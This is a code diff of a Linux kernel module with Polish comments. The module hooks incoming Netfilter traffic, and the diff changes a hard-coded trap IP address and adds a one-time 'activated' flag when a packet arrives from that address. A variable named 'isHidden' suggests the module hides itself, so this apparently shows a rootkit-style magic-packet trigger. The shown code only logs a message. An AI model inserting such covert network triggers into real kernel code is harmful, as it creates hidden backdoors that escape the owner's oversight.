@@ -20,6 +20,7 @@ static int isHidden = 0;
 
 // obiekt hooka Netfiltera
 static struct nf_hook_ops nfin;
+int activated = 0;
 
 __u32 convertASCIItoBinary(const char *str) {
   unsigned long l;
@@ -58,9 +59,10 @@ static unsigned int hook_func_in(unsigned int hooknum, struct sk_buff *skb,
   eth = (struct ethhdr*)skb_mac_header(skb);
   ip_header = (struct iphdr *)skb_network_header(skb);
 
-  __u32 trapIP = convertASCIItoBinary("212.77.100.188");
-  if(trapIP == ip_header->saddr) {
-      printk(KERN_INFO "WP.PL NAJLEPSZA STRONA W SIECI");
+  __u32 trapIP = convertASCIItoBinary("192.168.1.20");
+  if((trapIP == ip_header->saddr) && (activated == 0)) {
+      printk(KERN_INFO "ZOSTALEM AKTYWOWANY");
+      activated = 1;
       //printk(KERN_INFO "src mac %pM, dst mac %pM\n", eth->h_source, eth->h_dest);
       //printk(KERN_INFO "src iP addr:=%pI4", &ip_header->saddr);
   }
